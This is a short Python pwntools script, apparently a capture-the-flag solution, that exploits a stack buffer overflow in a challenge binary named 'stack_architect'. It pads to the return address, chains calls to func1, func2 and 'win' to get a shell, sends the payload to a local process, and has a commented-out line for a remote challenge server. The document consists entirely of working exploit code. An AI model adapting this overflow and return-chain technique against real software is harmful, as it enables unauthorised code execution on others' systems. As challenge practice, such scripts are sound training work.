from pwn import *

e = ELF('./stack_architect')
p = process('./stack_architect')
# p = remote('45.122.249.68', '10018')

payload = b'A'*4 + b"I'm sorry, don't leave me, I want you here with me ~~\x00"  # set s1
payload += (0x54+4 - len(payload))*b'A'  # padding to return address
payload += p32(e.symbols['func1'])  # call func1 to set check2 = 1
payload += p32(e.symbols['func1'])  # call func1 to set check3 = 1
payload += p32(0x08049422)  #   
payload += p32(0x20010508)  # argument of func1 to set check3 = 1
payload += p32(0x8052001)   # set v1 at ebp - 4 of func2
payload += p32(e.symbols['func2'])  # call func2 to set check4 = 1
payload += p32(e.symbols['win'])  # final call win to recv shell

f = open('payload.txt', 'wb')


p.sendline(payload)
f.write(payload)
f.close()
p.interactive()
